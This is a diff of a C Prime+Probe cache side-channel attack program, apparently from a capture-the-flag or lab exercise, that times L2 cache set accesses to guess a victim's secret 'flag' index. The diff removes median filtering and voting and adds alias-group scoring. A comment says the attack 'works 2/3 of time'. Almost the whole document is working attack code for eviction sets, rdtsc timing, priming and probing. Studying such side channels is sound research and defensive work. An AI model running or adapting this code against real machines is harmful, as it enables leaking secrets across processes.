@@ -11,12 +11,11 @@
 #define LINE_SIZE 64
 #define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE)
 
-#define REPEATS 2000          // number of prime-probe repetitions per round
+#define REPEATS 1000
 
 volatile uint8_t *buf;
 volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];
 
-// Read timestamp counter
 static inline uint64_t rdtsc() {
     unsigned hi, lo;
     asm volatile("mfence");
@@ -25,13 +24,11 @@ static inline uint64_t rdtsc() {
     return ((uint64_t)hi << 32) | lo;
 }
 
-// Wait for approximate CPU cycles
 static inline void wait_cycles(uint64_t cycles) {
     uint64_t start = rdtsc();
     while (rdtsc() - start < cycles);
 }
 
-// Fisher-Yates shuffle for random access
 void shuffle(int *arr) {
     for(int i = NUM_L2_CACHE_SETS - 1; i > 0; i--) {
         int j = rand() % (i + 1);
@@ -41,41 +38,25 @@ void shuffle(int *arr) {
     }
 }
 
-// Compute median to ignore low-latency noise
-uint64_t median(uint64_t *arr, int n) {
-    uint64_t temp[n];
-    for(int i = 0; i < n; i++) temp[i] = arr[i];
-
-    // Simple insertion sort
-    for(int i = 1; i < n; i++) {
-        uint64_t key = temp[i];
-        int j = i - 1;
-        while(j >= 0 && temp[j] > key) {
-            temp[j+1] = temp[j];
-            j--;
-        }
-        temp[j+1] = key;
-    }
-    return temp[n/2];
-}
-
 int main() {
+    /* works 2/3 of time. Randomize access, reverse probe, no usleep
+    */
     printf("Attacker ready. Prime+Probe starting...\n");
 
-    // mmap huge page for eviction sets
     buf = mmap(NULL,
                2*1024*1024,
                PROT_READ | PROT_WRITE,
                MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                -1,
                0);
+
     if(buf == (void*)-1){
         perror("mmap failed");
         exit(1);
     }
+
     *((char*)buf) = 1;
 
-    // initialize eviction sets
     for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
         for(int w = 0; w < WAYS; w++) {
             eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;
@@ -83,86 +64,84 @@ int main() {
     }
 
     volatile uint8_t tmp = 0;
-    srand(rdtsc());
-
-    int votes[NUM_L2_CACHE_SETS] = {0};
-    int rounds = 0;
-
-    // estimate victim duration
-    uint64_t sample_wait = 0;
-    for(int s = 0; s < 5; s++) {
-        uint64_t start = rdtsc();
-        wait_cycles(4000);
-        uint64_t end = rdtsc();
-        sample_wait += (end - start);
-    }
-    sample_wait /= 5;
 
     while(1) {
+
         uint64_t scores[NUM_L2_CACHE_SETS] = {0};
 
-        int perm[NUM_L2_CACHE_SETS];
-        for(int i = 0; i < NUM_L2_CACHE_SETS; i++) perm[i] = i;
-        shuffle(perm);
+        
 
-        // Prime+Probe loop
         for(int r = 0; r < REPEATS; r++) {
-            // PRIME all sets
+            int perm[NUM_L2_CACHE_SETS];
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+                perm[i] = i;
+            }
+            shuffle(perm);
+            
+            /* PRIME */
+            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+
                 int set = perm[i];
-                for(int w = 0; w < WAYS; w++) tmp ^= *eviction_sets[set][w];
+
+                for(int w = 0; w < WAYS; w++) {
+                    tmp ^= *eviction_sets[set][w];
+                }
             }
 
-            // wait for victim
-            wait_cycles(sample_wait);
+            wait_cycles(2000);
 
-            // PROBE all sets
+            /* PROBE */
             for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
+
                 int set = perm[i];
-                uint64_t start = rdtsc();
-                for(int w = WAYS-1; w >= 0; w--) tmp ^= *eviction_sets[set][w];
-                uint64_t end = rdtsc();
-                scores[set] += (end - start);
+
+                for(int w = WAYS-1; w >= 0; w--) {
+
+                    uint64_t start = rdtsc();
+                    tmp ^= *eviction_sets[set][w];
+                    uint64_t end = rdtsc();
+
+                    scores[set] += (end - start);
+                }
             }
         }
 
-        // compute median to ignore low-latency noise
-        uint64_t med = median(scores, NUM_L2_CACHE_SETS);
+        /* Combine alias groups */
+        int best_group = 0;
+        uint64_t best_score = 0;
 
-        int best_set = 0;
+        for(int base = 0; base < 256; base++) {
+
+            uint64_t group_score =
+                scores[base] +
+                scores[base + 256] +
+                scores[base + 512] +
+                scores[base + 768];
+
+            if(group_score > best_score) {
+                best_score = group_score;
+                best_group = base;
+            }
+        }
+
+        /* find best set within group */
+        int best_set = best_group;
         uint64_t best_latency = 0;
-        for(int set = 0; set < NUM_L2_CACHE_SETS; set++) {
-            if(scores[set] >= med) { // only consider high-latency sets
-                uint64_t avg = scores[set] / REPEATS;
-                if(avg > best_latency) {
-                    best_latency = avg;
-                    best_set = set;
-                }
+
+        for(int i = 0; i < 4; i++) {
+
+            int s = best_group + i*256;
+            uint64_t avg = scores[s] / REPEATS;
+
+            if(avg > best_latency) {
+                best_latency = avg;
+                best_set = s;
             }
         }
 
-        // increment vote for detected set
-        votes[best_set]++;
-        rounds++;
+        printf("Guessed flag: %d (latency=%lu)\n", best_set, best_latency);
 
-        // occasional decay to prevent old votes from dominating
-        if(rounds % 200 == 0){
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++)
-                votes[i] /= 2;
-        }
-
-        // print likely flag every 5 rounds
-        if(rounds % 5 == 0) {
-            int likely_flag = 0;
-            int max_votes = 0;
-            for(int i = 0; i < NUM_L2_CACHE_SETS; i++){
-                if(votes[i] > max_votes){
-                    max_votes = votes[i];
-                    likely_flag = i;
-                }
-            }
-            printf("Likely flag: %d (votes=%d)\n", likely_flag, max_votes);
-        }
+        wait_cycles(2000);
     }
 
     return 0;
